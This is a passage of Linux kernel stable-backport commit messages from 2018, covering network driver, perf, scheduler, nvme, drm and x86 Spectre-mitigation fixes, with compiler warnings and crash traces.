r8169: re-enable MSI-X on RTL8168g
[ Upstream commit 9675931e6b65d160d16bcc9472c1acef15524def ]
Similar to d49c88d7677b ("r8169: Enable MSI-X on RTL8106e") after
e9d0ba506ea8 ("PCI: Reprogram bridge prefetch registers on resume")
we can safely assume that this also fixes the root cause of
the issue worked around by 7c53a722459c ("r8169: don't use MSI-X on
RTL8168g"). So let's revert it.
Fixes: 7c53a722459c ("r8169: don't use MSI-X on RTL8168g")
Signed-off-by: Heiner Kallweit
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6b78ea67151b7eb98c554ce99ac690c73fd47ae6
Author: Nathan Chancellor
Date: Fri Oct 12 19:14:58 2018 -0700
net: qla3xxx: Remove overflowing shift statement
[ Upstream commit 8c3bf9b62b667456a57aefcf1689e826df146159 ]
Clang currently warns:
drivers/net/ethernet/qlogic/qla3xxx.c:384:24: warning: signed shift
result (0xF00000000) requires 37 bits to represent, but 'int' only has
32 bits [-Wshift-overflow]
((ISP\_NVRAM\_MASK << 16) | qdev->eeprom\_cmd\_data));
~~~~~~~~~~~~~~ ^ ~~
1 warning generated.
The warning is certainly accurate since ISP\_NVRAM\_MASK is defined as
(0x000F << 16) which is then shifted by 16, resulting in 64424509440,
well above UINT\_MAX.
Given that this is the only location in this driver where ISP\_NVRAM\_MASK
is shifted again, it seems likely that ISP\_NVRAM\_MASK was originally
defined without a shift and during the move of the shift to the
definition, this statement wasn't properly removed (since ISP\_NVRAM\_MASK
is used in the statenent right above this). Only the maintainers can
confirm this since this statment has been here since the driver was
first added to the kernel.
Link: https://github.com/ClangBuiltLinux/linux/issues/127
Signed-off-by: Nathan Chancellor
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8a5805bcc60399d049379e20bfc02d4d9ef7d33f
Author: Sebastian Andrzej Siewior
Date: Tue Oct 16 22:25:24 2018 +0200
x86/fpu: Remove second definition of fpu in \_\_fpu\_\_restore\_sig()
[ Upstream commit 6aa676761d4c1acfa31320e55fa1f83f3fcbbc7a ]
Commit:
c5bedc6847c3b ("x86/fpu: Get rid of PF\_USED\_MATH usage, convert it to fpu->fpstate\_active")
introduced the 'fpu' variable at top of \_\_restore\_xstate\_sig(),
which now shadows the other definition:
arch/x86/kernel/fpu/signal.c:318:28: warning: symbol 'fpu' shadows an earlier one
arch/x86/kernel/fpu/signal.c:271:20: originally declared here
Remove the shadowed definition of 'fpu', as the two definitions are the same.
Signed-off-by: Sebastian Andrzej Siewior
Reviewed-by: Andy Lutomirski
Cc: Borislav Petkov
Cc: Dave Hansen
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Fixes: c5bedc6847c3b ("x86/fpu: Get rid of PF\_USED\_MATH usage, convert it to fpu->fpstate\_active")
Link: http://lkml.kernel.org/r/20181016202525.29437-3-bigeasy@linutronix.de
Signed-off-by: Ingo Molnar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 027622eacae791bc761a4faa3bc77fe858126f49
Author: Milian Wolff
Date: Wed Sep 26 15:52:07 2018 +0200
perf report: Don't crash on invalid inline debug information
[ Upstream commit d4046e8e17b9f378cb861982ef71c63911b5dff3 ]
When the function name for an inline frame is invalid, we must not try
to demangle this symbol, otherwise we crash with:
#0 0x0000555555895c01 in bfd\_demangle ()
#1 0x0000555555823262 in demangle\_sym (dso=0x555555d92b90, elf\_name=0x0, kmodule=0) at util/symbol-elf.c:215
#2 dso\_\_demangle\_sym (dso=dso@entry=0x555555d92b90, kmodule=, kmodule@entry=0, elf\_name=elf\_name@entry=0x0) at util/symbol-elf.c:400
#3 0x00005555557fef4b in new\_inline\_sym (funcname=0x0, base\_sym=0x555555d92b90, dso=0x555555d92b90) at util/srcline.c:89
#4 inline\_list\_\_append\_dso\_a2l (dso=dso@entry=0x555555c7bb00, node=node@entry=0x555555e31810, sym=sym@entry=0x555555d92b90) at util/srcline.c:264
#5 0x00005555557ff27f in addr2line (dso\_name=dso\_name@entry=0x555555d92430 "/home/milian/.debug/.build-id/f7/186d14bb94f3c6161c010926da66033d24fce5/elf", addr=addr@entry=2888, file=file@entry=0x0,
line=line@entry=0x0, dso=dso@entry=0x555555c7bb00, unwind\_inlines=unwind\_inlines@entry=true, node=0x555555e31810, sym=0x555555d92b90) at util/srcline.c:313
#6 0x00005555557ffe7c in addr2inlines (sym=0x555555d92b90, dso=0x555555c7bb00, addr=2888, dso\_name=0x555555d92430 "/home/milian/.debug/.build-id/f7/186d14bb94f3c6161c010926da66033d24fce5/elf")
at util/srcline.c:358
So instead handle the case where we get invalid function names for
inlined frames and use a fallback '??' function name instead.
While this crash was originally reported by Hadrien for rust code, I can
now also reproduce it with trivial C++ code. Indeed, it seems like
libbfd fails to interpret the debug information for the inline frame
symbol name:
$ addr2line -e /home/milian/.debug/.build-id/f7/186d14bb94f3c6161c010926da66033d24fce5/elf -if b48
main
/usr/include/c++/8.2.1/complex:610
??
/usr/include/c++/8.2.1/complex:618
??
/usr/include/c++/8.2.1/complex:675
??
/usr/include/c++/8.2.1/complex:685
main
/home/milian/projects/kdab/rnd/hotspot/tests/test-clients/cpp-inlining/main.cpp:39
I've reported this bug upstream and also attached a patch there which
should fix this issue:
https://sourceware.org/bugzilla/show\_bug.cgi?id=23715
Reported-by: Hadrien Grasland
Signed-off-by: Milian Wolff
Cc: Jin Yao
Cc: Jiri Olsa
Cc: Namhyung Kim
Fixes: a64489c56c30 ("perf report: Find the inline stack for a given address")
[ The above 'Fixes:' cset is where originally the problem was
introduced, i.e. using a2l->funcname without checking if it is NULL,
but this current patch fixes the current codebase, i.e. multiple csets
were applied after a64489c56c30 before the problem was reported by Hadrien ]
Link: http://lkml.kernel.org/r/20180926135207.30263-3-milian.wolff@kdab.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit a34b5a9d90b177e2675fd2455b2e61b0f253418e
Author: David Miller
Date: Thu Oct 11 22:46:55 2018 -0700
perf cpu\_map: Align cpu map synthesized events properly.
[ Upstream commit 0ed149cf5239cc6e7e65bf00f769e8f1e91076c0 ]
The size of the resulting cpu map can be smaller than a multiple of
sizeof(u64), resulting in SIGBUS on cpus like Sparc as the next event
will not be aligned properly.
Signed-off-by: David S. Miller
Cc: Jiri Olsa
Cc: Kan Liang
Fixes: 6c872901af07 ("perf cpu\_map: Add cpu\_map event synthesize function")
Link: http://lkml.kernel.org/r/20181011.224655.716771175766946817.davem@davemloft.net
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 632f9277621be77d3618f7909dc46f54df65f44e
Author: Jarod Wilson
Date: Thu Sep 6 18:18:12 2018 -0400
perf tools: Fix use of alternatives to find JDIR
[ Upstream commit 36b8d4628d3cc8f5a748e508cce8673bc00fc63c ]
When a build is run from something like a cron job, the user's $PATH is
rather minimal, of note, not including /usr/sbin in my own case. Because
of that, an automated rpm package build ultimately fails to find
libperf-jvmti.so, because somewhere within the build, this happens...
/bin/sh: alternatives: command not found
/bin/sh: alternatives: command not found
Makefile.config:849: No openjdk development package found, please install
JDK package, e.g. openjdk-8-jdk, java-1.8.0-openjdk-devel
...and while the build continues, libperf-jvmti.so isn't built, and
things fall down when rpm tries to find all the %files specified. Exact
same system builds everything just fine when the job is launched from a
login shell instead of a cron job, since alternatives is in $PATH, so
openjdk is actually found.
The test required to get into this section of code actually specifies
the full path, as does a block just above it, so let's do that here too.
Signed-off-by: Jarod Wilson
Acked-by: Jiri Olsa
Cc: Alexander Shishkin
Cc: Namhyung Kim
Cc: Peter Zijlstra
Cc: Stephane Eranian
Cc: William Cohen
Fixes: d4dfdf00d43e ("perf jvmti: Plug compilation into perf build")
Link: http://lkml.kernel.org/r/20180906221812.11167-1-jarod@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 71797bf860be6b747ba3eb5bdeef9a1aa90a1b5b
Author: Jiri Olsa
Date: Wed Oct 3 23:20:52 2018 +0200
perf evsel: Store ids for events with their own cpus perf\_event\_\_synthesize\_event\_update\_cpus
[ Upstream commit 4ab8455f8bd83298bf7f67ab9357e3b1cc765c7d ]
John reported crash when recording on an event under PMU with cpumask defined:
root@localhost:~# ./perf\_debug\_ record -e armv8\_pmuv3\_0/br\_mis\_pred/ sleep 1
perf: Segmentation fault
Obtained 9 stack frames.
./perf\_debug\_() [0x4c5ef8]
[0xffff82ba267c]
./perf\_debug\_() [0x4bc5a8]
./perf\_debug\_() [0x419550]
./perf\_debug\_() [0x41a928]
./perf\_debug\_() [0x472f58]
./perf\_debug\_() [0x473210]
./perf\_debug\_() [0x4070f4]
/lib/aarch64-linux-gnu/libc.so.6(\_\_libc\_start\_main+0xe0) [0xffff8294c8a0]
Segmentation fault (core dumped)
We synthesize an update event that needs to touch the evsel id array, which is
not defined at that time. Fixing this by forcing the id allocation for events
with their own cpus.
Reported-by: John Garry
Signed-off-by: Jiri Olsa
Tested-by: John Garry
Cc: Alexander Shishkin
Cc: Andi Kleen
Cc: Mark Rutland
Cc: Namhyung Kim
Cc: Peter Zijlstra
Cc: Will Deacon
Cc: linux-arm-kernel@lists.infradead.org
Cc: linuxarm@huawei.com
Fixes: bfd8f72c2778 ("perf record: Synthesize unit/scale/... in event update")
Link: http://lkml.kernel.org/r/20181003212052.GA32371@krava
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f8148d7cea1f4b3910b022c090a5d36060c7b269
Author: Song Muchun
Date: Sun Oct 14 19:26:12 2018 +0800
sched/fair: Fix the min\_vruntime update logic in dequeue\_entity()
[ Upstream commit 9845c49cc9bbb317a0bc9e9cf78d8e09d54c9af0 ]
The comment and the code around the update\_min\_vruntime() call in
dequeue\_entity() are not in agreement.
>From commit:
b60205c7c558 ("sched/fair: Fix min\_vruntime tracking")
I think that we want to update min\_vruntime when a task is sleeping/migrating.
So, the check is inverted there - fix it.
Signed-off-by: Song Muchun
Cc: Linus Torvalds
Cc: Mike Galbraith
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Fixes: b60205c7c558 ("sched/fair: Fix min\_vruntime tracking")
Link: http://lkml.kernel.org/r/20181014112612.2614-1-smuchun@gmail.com
Signed-off-by: Ingo Molnar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e0d017fe2a4322711793a4c794026b20100f0173
Author: Pieter Jansen van Vuuren
Date: Mon Oct 15 16:52:25 2018 -0700
nfp: flower: use offsets provided by pedit instead of index for ipv6
[ Upstream commit 140b6abac26d799f75d772ab5e969b34ad8d68f1 ]
Previously when populating the set ipv6 address action, we incorrectly
made use of pedit's key index to determine which 32bit word should be
set. We now calculate which word has been selected based on the offset
provided by the pedit action.
Fixes: 354b82bb320e ("nfp: add set ipv6 source and destination address")
Signed-off-by: Pieter Jansen van Vuuren
Reviewed-by: Jakub Kicinski
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d8e7c3329332cb8aed633991ec6369bc874188b1
Author: Pieter Jansen van Vuuren
Date: Mon Oct 15 16:52:23 2018 -0700
nfp: flower: fix pedit set actions for multiple partial masks
[ Upstream commit 8913806f166e47c6b3fe8253e9cfb9caabe64341 ]
Previously we did not correctly change headers when using multiple
pedit actions with partial masks. We now take this into account and
no longer just commit the last pedit action.
Fixes: c0b1bd9a8b8a ("nfp: add set ipv4 header action flower offload")
Signed-off-by: Pieter Jansen van Vuuren
Reviewed-by: Jakub Kicinski
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 23ef37c73bd70bde1ebf7c9f9da9e6e0d92d66a7
Author: Jian-Hong Pan
Date: Thu Sep 27 12:09:48 2018 +0800
r8169: Enable MSI-X on RTL8106e
[ Upstream commit d49c88d7677ba737e9d2759a87db0402d5ab2607 ]
Originally, we have an issue where r8169 MSI-X interrupt is broken after
S3 suspend/resume on RTL8106e of ASUS X441UAR.
02:00.0 Ethernet controller [0200]: Realtek Semiconductor Co., Ltd.
RTL8101/2/6E PCI Express Fast/Gigabit Ethernet controller [10ec:8136]
(rev 07)
Subsystem: ASUSTeK Computer Inc. RTL810xE PCI Express Fast
Ethernet controller [1043:200f]
Flags: bus master, fast devsel, latency 0, IRQ 16
I/O ports at e000 [size=256]
Memory at ef100000 (64-bit, non-prefetchable) [size=4K]
Memory at e0000000 (64-bit, prefetchable) [size=16K]
Capabilities: [40] Power Management version 3
Capabilities: [50] MSI: Enable- Count=1/1 Maskable- 64bit+
Capabilities: [70] Express Endpoint, MSI 01
Capabilities: [b0] MSI-X: Enable+ Count=4 Masked-
Capabilities: [d0] Vital Product Data
Capabilities: [100] Advanced Error Reporting
Capabilities: [140] Virtual Channel
Capabilities: [160] Device Serial Number 01-00-00-00-36-4c-e0-00
Capabilities: [170] Latency Tolerance Reporting
Kernel driver in use: r8169
Kernel modules: r8169
We found the all of the values in PCI BAR=4 of the ethernet adapter
become 0xFF after system resumes. That breaks the MSI-X interrupt.
Therefore, we can only fall back to MSI interrupt to fix the issue at
that time.
However, there is a commit which resolves the drivers getting nothing in
PCI BAR=4 after system resumes. It is 04cb3ae895d7 "PCI: Reprogram
bridge prefetch registers on resume" by Daniel Drake.
After apply the patch, the ethernet adapter works fine before suspend
and after resume. So, we can revert the workaround after the commit
"PCI: Reprogram bridge prefetch registers on resume" is merged into main
tree.
This patch reverts commit 7bb05b85bc2d1a1b647b91424b2ed4a18e6ecd81
"r8169: don't use MSI-X on RTL8106e".
Buglink: https://bugzilla.kernel.org/show\_bug.cgi?id=201181
Fixes: 7bb05b85bc2d ("r8169: don't use MSI-X on RTL8106e")
Signed-off-by: Jian-Hong Pan
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1810feb860b1dcf93c57158047ce28c45a3d155f
Author: Jiri Olsa
Date: Wed Oct 10 10:03:39 2018 +0200
perf vendor events intel: Fix wrong filter\_band\* values for uncore events
[ Upstream commit 94aafb74cee0002e2f2eb6dc5376f54d5951ab4d ]
Michael reported that he could not stat following event:
$ perf stat -e unc\_p\_freq\_ge\_1200mhz\_cycles -a -- ls
event syntax error: '..e\_1200mhz\_cycles'
\\_\_\_ value too big for format, maximum is 255
Run 'perf list' for a list of valid events
The event is unwrapped into:
uncore\_pcu/event=0xb,filter\_band0=1200/
where filter\_band0 format says it's one byte only:
# cat uncore\_pcu/format/filter\_band0
config1:0-7
while JSON files specifies bigger number:
"Filter": "filter\_band0=1200",
all the filter\_band\* formats show 1 byte width:
# cat uncore\_pcu/format/filter\_band1
config1:8-15
# cat uncore\_pcu/format/filter\_band2
config1:16-23
# cat uncore\_pcu/format/filter\_band3
config1:24-31
The reason of the issue is that filter\_band\* values are supposed to be
in 100Mhz units.. it's stated in the JSON help for the events, like:
filter\_band3=XXX, with XXX in 100Mhz units
This patch divides the filter\_band\* values by 100, plus there's couple
of changes that actually change the number completely, like:
- "Filter": "edge=1,filter\_band2=4000",
+ "Filter": "edge=1,filter\_band2=30",
Reported-by: Michael Petlan
Signed-off-by: Jiri Olsa
Acked-by: Andi Kleen
Cc: Alexander Shishkin
Cc: Kan Liang
Cc: Namhyung Kim
Cc: Peter Zijlstra
Link: http://lkml.kernel.org/r/20181010080339.GB15790@krava
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4e670a32d2422f8a1fd84491e33c4d025f77887c
Author: Florian Westphal
Date: Wed Oct 10 18:02:21 2018 +0200
xfrm: policy: use hlist rcu variants on insert
[ Upstream commit 9dffff200fd178f11dd50eb1fd8ccd0650c9284e ]
bydst table/list lookups use rcu, so insertions must use rcu versions.
Fixes: a7c44247f704e ("xfrm: policy: make xfrm\_policy\_lookup\_bytype lockless")
Signed-off-by: Florian Westphal
Signed-off-by: Steffen Klassert
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2b0cdfb2943915368adb5bcfea12ba758e245247
Author: Björn Töpel
Date: Mon Oct 8 19:40:16 2018 +0200
xsk: do not call synchronize\_net() under RCU read lock
[ Upstream commit cee271678d0e3177a25d0fcb2fa5e051d48e4262 ]
The XSKMAP update and delete functions called synchronize\_net(), which
can sleep. It is not allowed to sleep during an RCU read section.
Instead we need to make sure that the sock sk\_destruct (xsk\_destruct)
function is asynchronously called after an RCU grace period. Setting
the SOCK\_RCU\_FREE flag for XDP sockets takes care of this.
Fixes: fbfc504a24f5 ("bpf: introduce new bpf AF\_XDP map type BPF\_MAP\_TYPE\_XSKMAP")
Reported-by: Eric Dumazet
Signed-off-by: Björn Töpel
Acked-by: Song Liu
Signed-off-by: Daniel Borkmann
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d1d394e201f050b1fe5261933d67cb2f3a76c78c
Author: Shuah Khan (Samsung OSG)
Date: Fri Oct 5 16:17:43 2018 -0600
selftests: usbip: add wait after attach and before checking port status
[ Upstream commit 4b0aaacee51eb6592a03fdefd5ce97558518e291 ]
Add sleep between attach and "usbip port" check to make sure status is
updated. Running attach and query back shows incorrect status.
Signed-off-by: Shuah Khan (Samsung OSG)
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c714f12f60ba23c8db44ee894fd8eef19715df88
Author: Jiri Olsa
Date: Wed Oct 3 09:20:46 2018 +0200
Revert "perf tools: Fix PMU term format max value calculation"
[ Upstream commit 1b9caa10b31dda0866f4028e4bfb923fb6e4072f ]
This reverts commit ac0e2cd555373ae6f8f3a3ad3fbbf5b6d1e7aaaa.
Michael reported an issue with oversized terms values assignment
and I noticed there was actually a misunderstanding of the max
value check in the past.
The above commit's changelog says:
If bit 21 is set, there is parsing issues as below.
$ perf stat -a -e uncore\_qpi\_0/event=0x200002,umask=0x8/
event syntax error: '..pi\_0/event=0x200002,umask=0x8/'
\\_\_\_ value too big for format, maximum is 511
But there's no issue there, because the event value is distributed
along the value defined by the format. Even if the format defines
separated bit, the value is treated as a continual number, which
should follow the format definition.
In above case it's 9-bit value with last bit separated:
$ cat uncore\_qpi\_0/format/event
config:0-7,21
Hence the value 0x200002 is correctly reported as format violation,
because it exceeds 9 bits. It should have been 0x102 instead, which
sets the 9th bit - the bit 21 of the format.
$ perf stat -vv -a -e uncore\_qpi\_0/event=0x102,umask=0x8/
Using CPUID GenuineIntel-6-2D
...
------------------------------------------------------------
perf\_event\_attr:
type 10
size 112
config 0x200802
sample\_type IDENTIFIER
...
Reported-by: Michael Petlan
Signed-off-by: Jiri Olsa
Cc: Alexander Shishkin
Cc: Andi Kleen
Cc: Kan Liang
Cc: Namhyung Kim
Cc: Peter Zijlstra
Fixes: ac0e2cd55537 ("perf tools: Fix PMU term format max value calculation")
Link: http://lkml.kernel.org/r/20181003072046.29276-1-jolsa@kernel.org
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7ceb3d05aff50cbedf0ef74ad8bdd38e3e086451
Author: Keith Busch
Date: Fri Oct 5 08:57:06 2018 -0600
nvme: remove ns sibling before clearing path
[ Upstream commit 48f78be3326052a7718678ff9a78d6d884a50323 ]
The code had been clearing a namespace being deleted as the current
path while that namespace was still in the path siblings list. It is
possible a new IO could set that namespace back to the current path
since it appeared to be an eligable path to select, which may result in
a use-after-free error.
This patch ensures a namespace being removed is not eligable to be reset
as a current path prior to clearing it as the current path.
Signed-off-by: Keith Busch
Reviewed-by: Sagi Grimberg
Signed-off-by: Christoph Hellwig
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c5849e9bf203331ac796c3028c816a0d8ef3c814
Author: Eric Dumazet
Date: Fri Oct 5 19:38:46 2018 -0700
bpf: do not blindly change rlimit in reuseport net selftest
[ Upstream commit 262f9d811c7608f1e74258ceecfe1fa213bdf912 ]
If the current process has unlimited RLIMIT\_MEMLOCK,
we should should leave it as is.
Fixes: 941ff6f11c02 ("bpf: fix rlimit in reuseport net selftest")
Signed-off-by: John Sperbeck
Signed-off-by: Eric Dumazet
Acked-by: Daniel Borkmann
Signed-off-by: Daniel Borkmann
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6dd0eaf03c0ac639665611d1ab9b8609c07a9435
Author: Tomi Valkeinen
Date: Mon Sep 17 14:00:54 2018 +0300
drm: fix use of freed memory in drm\_mode\_setcrtc
[ Upstream commit 064253c1c0625efd0362a0b7ecdbe8bee2a2904d ]
drm\_mode\_setcrtc() retries modesetting in case one of the functions it
calls returns -EDEADLK. connector\_set, mode and fb are freed before
retrying, but they are not set to NULL. This can cause
drm\_mode\_setcrtc() to use those variables.
For example: On the first try \_\_drm\_mode\_set\_config\_internal() returns
-EDEADLK. connector\_set, mode and fb are freed. Next retry starts, and
drm\_modeset\_lock\_all\_ctx() returns -EDEADLK, and we jump to 'out'. The
code will happily try to release all three again.
This leads to crashes of different kinds, depending on the sequence the
EDEADLKs happen.
Fix this by setting the three variables to NULL at the start of the
retry loop.
Signed-off-by: Tomi Valkeinen
Reviewed-by: Ville Syrjälä
Reviewed-by: Daniel Vetter
Link: https://patchwork.freedesktop.org/patch/msgid/20180917110054.4053-1-tomi.valkeinen@ti.com
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c9493729df3965bee9a15e2a5e3c2eed34d3940f
Author: Marek Szyprowski
Date: Wed Sep 5 12:02:15 2018 +0200
ARM: dts: exynos: Disable pull control for MAX8997 interrupts on Origen
commit f5e758b8358f6c27e8a351ddf0b441a64cdabb94 upstream.
PMIC\_IRQB and PMIC\_KEYINB lines on Exynos4210-based Origen board have
external pull-up resistors, so disable any pull control for those lines
in respective pin controller node. This fixes support for MAX8997
interrupts and enables operation of wakeup from MAX8997 RTC alarm.
Signed-off-by: Marek Szyprowski
Fixes: 17419726aaa1 ("ARM: dts: add max8997 device node for exynos4210-origen board")
Cc:
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit db611db0ee15ab4d01dde3d7a12df90874eaeea4
Author: Sai Praneeth
Date: Wed Aug 1 11:42:25 2018 -0700
x86/speculation: Support Enhanced IBRS on future CPUs
commit 706d51681d636a0c4a5ef53395ec3b803e45ed4d upstream.
Future Intel processors will support "Enhanced IBRS" which is an "always
on" mode i.e. IBRS bit in SPEC\_CTRL MSR is enabled once and never
disabled.
From the specification [1]:
"With enhanced IBRS, the predicted targets of indirect branches
executed cannot be controlled by software that was executed in a less
privileged predictor mode or on another logical processor. As a
result, software operating on a processor with enhanced IBRS need not
use WRMSR to set IA32\_SPEC\_CTRL.IBRS after every transition to a more
privileged predictor mode. Software can isolate predictor modes
effectively simply by setting the bit once. Software need not disable
enhanced IBRS prior to entering a sleep state such as MWAIT or HLT."
If Enhanced IBRS is supported by the processor then use it as the
preferred spectre v2 mitigation mechanism instead of Retpoline. Intel's
Retpoline white paper [2] states:
"Retpoline is known to be an effective branch target injection (Spectre
variant 2) mitigation on Intel processors belonging to family 6
(enumerated by the CPUID instruction) that do not have support for
enhanced IBRS. On processors that support enhanced IBRS, it should be
used for mitigation instead of retpoline."
The reason why Enhanced IBRS is the recommended mitigation on processors
which support it is that these processors also support CET which
provides a defense against ROP attacks. Retpoline is very similar to ROP
techniques and might trigger false positives in the CET defense.
If Enhanced IBRS is selected as the mitigation technique for spectre v2,
the IBRS bit in SPEC\_CTRL MSR is set once at boot time and never
cleared. Kernel also has to make sure that IBRS bit remains set after
VMEXIT because the guest might have cleared the bit. This is already
covered by the existing x86\_spec\_ctrl\_set\_guest() and
x86\_spec\_ctrl\_restore\_host() speculation control functions.
Enhanced IBRS still requires IBPB for full mitigation.
[1] Speculative-Execution-Side-Channel-Mitigations.pdf
[2] Retpoline-A-Branch-Target-Injection-Mitigation.pdf
Both documents are available at:
https://bugzilla.kernel.org/show\_bug.cgi?id=199511
Originally-by: David Woodhouse
Signed-off-by: Sai Praneeth Prakhya
Signed-off-by: Thomas Gleixner
Cc: Tim C Chen
Cc: Dave Hansen
Cc: Ravi Shankar
Link: https://lkml.kernel.org/r/1533148945-24095-1-git-send-email-sai.praneeth.prakhya@intel.com
Signed-off-by: Greg Kroah-Hartman
commit 178ecd6214509e1ed3eadd0479b3b7f17ff55bd0
Author: Sebastian Andrzej Siewior
Date: Wed Oct 17 12:34:32 2018 +0200
x86/mm/pat: Disable preemption around \_\_flush\_tlb\_all()
commit f77084d96355f5fba8e2c1fb3a51a393b1570de7 upstream.
The WARN\_ON\_ONCE(\_\_read\_cr3() != build\_cr3()) in switch\_mm\_irqs\_off()
triggers every once in a while during a snapshotted system upgrade.
The warning triggers since commit decab0888e6e ("x86/mm: Remove
preempt\_disable/enable() from \_\_native\_flush\_tlb()"). The callchain is:
get\_page\_from\_freelist() -> post\_alloc\_hook() -> \_\_kernel\_map\_pages()
with CONFIG\_DEBUG\_PAGEALLOC enabled.
Disable preemption during CR3 reset / \_\_flush\_tlb\_all() and add a comment
why preemption has to be disabled so it won't be removed accidentaly.
Add another preemptible() check in \_\_flush\_tlb\_all() to catch callers with
enabled preemption when PGE is enabled, because PGE enabled does not
trigger the warning in \_\_native\_flush\_tlb(). Suggested by Andy Lutomirski.
Fixes: decab0888e6e ("x86/mm: Remove preempt\_disable/enable() from \_\_native\_flush\_tlb()")
Signed-off-by: Sebastian Andrzej Siewior
Signed-off-by: Thomas Gleixner
Cc: Andy Lutomirski
Cc: Dave Hansen
Cc: Peter Zijlstra
Cc: Borislav Petkov
Cc: stable@vger.kernel.org
Link: https://lkml.kernel.org/r/20181017103432.zgv46nlu3hc7k4rq@linutronix.de
Signed-off-by: Greg Kroah-Hartman
commit d601f8c2e0b0d7f2bb81fc4f50324fb2c0cfdabc
Author: He Zhe
Date: Tue Aug 14 23:33:42 2018 +0800
x86/corruption-check: Fix panic in memory\_corruption\_check() when boot option without value is provided
commit ccde460b9ae5c2bd5e4742af0a7f623c2daad566 upstream.
memory\_corruption\_check[{\_period|\_size}]()'s handlers do not check input
argument before passing it to kstrtoul() or simple\_strtoull(). The argument
would be a NULL pointer if each of the kernel parameters, without its
value, is set in command line and thus cause the following panic.
PANIC: early exception 0xe3 IP 10:ffffffff73587c22 error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.18-rc8+ #2
[ 0.000000] RIP: 0010:kstrtoull+0x2/0x10
...
[ 0.000000] Call Trace
[ 0.000000] ? set\_corruption\_check+0x21/0x49
[ 0.000000] ? do\_early\_param+0x4d/0x82
[ 0.000000] ? parse\_args+0x212/0x330
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_options+0x20/0x23
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_param+0x2d/0x39
[ 0.000000] ? setup\_arch+0x2f7/0xbf4
[ 0.000000] ? start\_kernel+0x5e/0x4c2
[ 0.000000] ? load\_ucode\_bsp+0x113/0x12f
[ 0.000000] ? secondary\_startup\_64+0xa5/0xb0
This patch adds checks to prevent the panic.
Signed-off-by: He Zhe
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: gregkh@linuxfoundation.org
Cc: kstewart@linuxfoundation.org
Cc: pombredanne@nexb.com
Cc: stable@vger.kernel.org
Link: http://lkml.kernel.org/r/1534260823-87917-1-git-send-email-zhe.he@windriver.com
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 1a359f8f8ec82919c012c77e7531184097cbd9ea
Author: Juergen Gross
Date: Wed Oct 10 08:14:54 2018 +0200
x86/xen: Fix boot loader version reported for PVH guests
commit 357d291ce035d1b757568058f3c9898c60d125b1 upstream.
The boot loader version reported via sysfs is wrong in case of the
kernel being booted via the Xen PVH boot entry. it should be 2.12
(0x020c), but it is reported to be 2.18 (0x0212).
As the current way to set the version is error prone use the more
readable variant (2 << 8) | 12.
Signed-off-by: Juergen Gross
Cc:  # 4.12
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: boris.ostrovsky@oracle.com
Cc: bp@alien8.de
Cc: corbet@lwn.net
Cc: linux-doc@vger.kernel.org
Cc: xen-devel@lists.xenproject.org
Link: http://lkml.kernel.org/r/20181010061456.22238-2-jgross@suse.com
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 02fb68711ba6d540087999d7cd4a67c16b69f2c0
Author: Jiri Kosina
Date: Tue Sep 25 14:38:55 2018 +0200
x86/speculation: Enable cross-hyperthread spectre v2 STIBP mitigation
commit 53c613fe6349994f023245519265999eed75957f upstream.
STIBP is a feature provided by certain Intel ucodes / CPUs. This feature
(once enabled) prevents cross-hyperthread control of decisions made by
indirect branch predictors.
Enable this feature if
- the CPU is vulnerable to spectre v2
- the CPU supports SMT and has SMT siblings online
- spectre\_v2 mitigation autoselection is enabled (default)
After some previous discussion, this leaves STIBP on all the time, as wrmsr
on crossing kernel boundary is a no-no. This could perhaps later be a bit
more optimized (like disabling it in NOHZ, experiment with disabling it in
idle, etc) if needed.
Note that the synchronization of the mask manipulation via newly added
spec\_ctrl\_mutex is currently not strictly needed, as the only updater is
already being serialized by cpu\_add\_remove\_lock, but let's make this a
little bit more future-proof.
Signed-off-by: Jiri Kosina
Signed-off-by: Thomas Gleixner
Cc: Peter Zijlstra
Cc: Josh Poimboeuf
